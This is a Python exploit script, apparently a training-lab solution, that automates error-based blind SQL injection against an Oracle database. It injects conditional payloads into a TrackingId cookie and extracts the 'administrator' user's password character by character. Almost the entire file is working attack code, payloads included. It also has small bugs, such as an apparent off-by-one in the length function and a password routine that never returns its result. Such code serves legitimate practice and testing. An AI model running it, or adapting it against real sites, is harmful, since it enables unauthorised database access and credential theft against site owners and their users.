#!/usr/bin/env python3
# Blind SQL injection with conditional responses (Oracle)
import requests
import string
import sys

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_length(url, cookie, session):
    for i in range(1,100):
        # '||(SELECT CASE WHEN LENGTH(password)=10 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        payload = f"'||(SELECT CASE WHEN LENGTH(password)={i} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        c = {'TrackingId':f'{cookie}{payload}', 'session':f'{session}'}
        req = requests.get(url, cookies=c, verify=False, proxies=p)
        if "Internal Server Error" in req.text:
            return i+1
        i = i+1
    return False

def get_password(url, cookie, session, number):
    admin_passwd = list()
    for i in range(1,number+1):
        for character in string.printable:
            # '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            c = {'TrackingId':f'{cookie}{payload}', 'session':f'{session}'}
            req = requests.get(url, cookies=c, verify=False, proxies=p)
            if "Internal Server Error" in req.text:
                admin_passwd.append(character)
                break
            x = ''.join(admin_passwd) + character
            sys.stdout.write('\r' + x)
            sys.stdout.flush()

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        cookie = sys.argv[2].strip()
        session = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <cookie_value> <session_value>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com abcdef123 abcdef123".format(sys.argv[0]))
        sys.exit(1)

    print("[-] Finding the password length...")
    passwd_length = get_length(url, cookie, session)
    if passwd_length:
        print("[-] Found the password length... [{}]".format(passwd_length))
        print("[-] Retrieving administrator password...")
        get_password(url, cookie, session, passwd_length)
    else:
        print("[-] Can't find the password length!")